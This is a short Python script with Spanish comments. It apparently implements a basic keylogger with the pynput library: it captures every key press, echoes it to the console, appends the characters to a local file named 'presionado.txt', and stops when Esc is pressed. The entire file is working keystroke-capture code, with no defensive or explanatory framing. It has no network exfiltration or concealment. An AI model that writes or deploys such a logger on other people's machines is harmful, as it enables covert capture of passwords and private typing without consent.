from pynput  import keyboard


teclas_presionadas = {}
#crear archivo
archivo = open("presionado.txt", "a")

#mirar que se esta presionando 
def on_press(key):
    try:
        print(f"Tecla presionada: {key.char}")
        with open("presionado.txt", "a") as archivo:
            archivo.write(f"{key.char}")
            archivo.flush()
#si no es una tecla comun, entonces es una tecla especial
    except AttributeError:
        print(f"Tecla especial presionada: {key}")
        with open("presionado.txt", "a") as archivo:
            archivo.write(f" ")
            archivo.flush()
        #salir del programa
def on_release(key):
       if key == keyboard.Key.esc:
        
        return False
#crear archivo si no lo esta, por asegurar
with open("presionado.txt", "a") as archivo:
    pass
#escucha activa
listener = keyboard.Listener(on_press=on_press, on_release=on_release) 
listener.start()
listener.join()

